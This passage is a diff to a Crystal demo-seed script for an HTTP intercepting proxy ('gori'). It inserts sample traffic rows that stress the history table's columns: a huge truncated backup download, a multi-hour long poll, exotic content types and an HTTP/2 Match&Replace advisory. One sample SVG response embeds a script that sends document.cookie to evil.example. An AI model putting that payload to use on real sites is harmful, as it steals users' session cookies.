+# actually pulling 2.5 GB through a proxy. The SIZE column reports what the origin SENT.
+big_dump = Bytes.new(2048) { |i| (0x20 + (i % 95)).to_u8 }
+raw_flow(store, tick.call, host: "internal.demo.test", method: "GET",
+  target: "/backups/demoshop-2026-06-19.sql.gz",
+  req_head: "GET /backups/demoshop-2026-06-19.sql.gz HTTP/1.1\r\nHost: internal.demo.test\r\n" \
+            "User-Agent: gori-demo/1.0\r\nAuthorization: Basic ZGVtbzptZXRyaWNzLXB3\r\n\r\n",
+  status: 200, reason: "OK", ctype: "application/octet-stream",
+  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/octet-stream\r\n" \
+             "Content-Disposition: attachment; filename=\"demoshop-2026-06-19.sql.gz\"\r\n" \
+             "Content-Length: 2684354560\r\n\r\n",
+  resp_body: big_dump, resp_body_size: 2_684_354_560_i64, resp_truncated: true,
+  dur_us: 214_000_000_i64)
+
+# A long poll that really did hold for three and a half hours before returning one event.
+# `Fmt.dur` has an hour tier for exactly this, and nothing in the demo reached it — the
+# slowest row was 31 s.
+raw_flow(store, tick.call, host: "api.demo.test", method: "GET", target: "/v1/notifications/poll",
+  req_head: "GET /v1/notifications/poll HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
+            "Authorization: Bearer #{jwt}\r\nX-Poll-Timeout: 14400\r\n\r\n",
+  status: 200, reason: "OK", ctype: "application/json",
+  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n" \
+             "Content-Length: 52\r\n\r\n",
+  resp_body: %({"events":[{"id":41,"kind":"order.paid","order":9}]}).to_slice,
+  dur_us: 12_600_000_000_i64)
+
+# The TYPE column keeps 6 columns for a subtype that `fmt_mime` has already reduced. These
+# four are the ones that reduce badly: an Office document type 65 characters long, a
+# structured-suffix vendor JSON, a font, and WebAssembly — one row each so the column can be
+# looked at rather than reasoned about.
+add_flow(store, tick.call, host: "dav.demo.test", target: "/dav/public/q3-final.docx",
+  status: 200, reason: "OK",
+  ctype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+  resp_body: "PK\u{0003}\u{0004}demo-docx-bytes", dur_us: 143_000_i64)
+
+add_flow(store, tick.call, host: "api.demo.test", target: "/v1/orders/9",
+  req_headers: {"Accept" => "application/vnd.api+json", "Authorization" => "Bearer #{jwt}"},
+  status: 200, reason: "OK", ctype: "application/vnd.api+json",
+  resp_body: %({"data":{"type":"orders","id":"9","attributes":{"total":3998,"status":"paid"}}}),
+  dur_us: 34_000_i64)
+
+add_flow(store, tick.call, host: "cdn.demo.test", target: "/fonts/inter-var.woff2",
+  status: 200, reason: "OK", ctype: "font/woff2",
+  resp_headers: {"Cache-Control"               => "public, max-age=31536000, immutable",
+                 "Access-Control-Allow-Origin" => "*"},
+  resp_body: "wOF2demo-font-bytes", dur_us: 57_000_i64)
+
+add_flow(store, tick.call, host: "cdn.demo.test", target: "/wasm/imagecodecs.wasm",
+  status: 200, reason: "OK", ctype: "application/wasm",
+  resp_body: "\u{0000}asm\u{0001}\u{0000}\u{0000}\u{0000}demo", dur_us: 128_000_i64)
+
+# An SVG served as an image, which is the one image type that is also a script host — and the
+# TYPE column's `svg+xml` special case.
+add_flow(store, tick.call, host: "cdn.demo.test", target: "/assets/logo.svg",
+  status: 200, reason: "OK", ctype: "image/svg+xml",
+  resp_body: %(<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">) +
+             %(<script>fetch('https://evil.example/?c='+document.cookie)</script><circle r="8"/></svg>),
+  dur_us: 22_000_i64)
+
+# ## The advisory
+#
+# The last thing History renders that nothing in the demo produced: `FlowRow#advisory`, gori's
+# own prose about an exchange, drawn in the detail pane above the request. This is the real
+# text `H2::HeadRewrite#note_skipped` writes when a Match&Replace head rule could not be
+# applied because the h2 head has no HTTP/1.1 text form (#517) — the operator's rule did not
+# fire, the bytes went out untouched, and the row is the only place that fact exists.
+adv_conn = store.insert_h2_connection("api.demo.test", 443, "h2")
+store.insert_h2_frame(adv_conn, "out", 0x1_u8, 0x5_u8, 1_u32,
+  Bytes[0x82, 0x87, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x07])
+store.insert_h2_frame(adv_conn, "in", 0x1_u8, 0x4_u8, 1_u32, Bytes[0x88, 0x5f, 0x10, 0x61, 0x70, 0x70])
+store.flush
+raw_flow(store, tick.call, host: "api.demo.test", method: "GET", target: "/v1/me",
+  http: "HTTP/2",
+  req_head: "GET /v1/me HTTP/2\r\nHost: api.demo.test\r\nuser-agent: gori-demo/1.0\r\n" \
+            "authorization: Bearer #{jwt}\r\n\r\n",
+  status: 200, ctype: "application/json",
+  resp_head: "HTTP/2 200\r\ncontent-type: application/json\r\nx-frame-options: DENY\r\n\r\n",
+  resp_body: %({"id":1,"email":"alice@demo.test","role":"customer"}).to_slice,
+  dur_us: 43_000_i64, h2_conn_id: adv_conn, h2_stream_id: 1_i64,
+  advisory: "Match&Replace was NOT applied to this response head: it has no HTTP/1.1 text form " \
+            "(field value contains CR/LF). The fields went out exactly as they arrived, and an " \
+            "intercept edit to it would be refused for the same reason (#517)")
+
+store.flush
+puts "• inserted act-five column stress: 24 distinct methods (RFC 9110 · WebDAV/DeltaV/DASL · " \
+     "PURGE · lowercase `get` · a 40-byte fuzz token), punycode/U-label/homograph hosts, " \
+     "wide+RTL+zero-width paths, 206/307/405/417/418/451/501/999, a truncated 2.5 GB body, " \
+     "a 3.5 h long poll, 5 exotic content types and an h2 advisory"
 
 # --- Rewriter (Match & Replace rules applied to in-flight traffic) -----------
 # A few illustrative rules — the security-hardening two are ON; the rest are OFF so
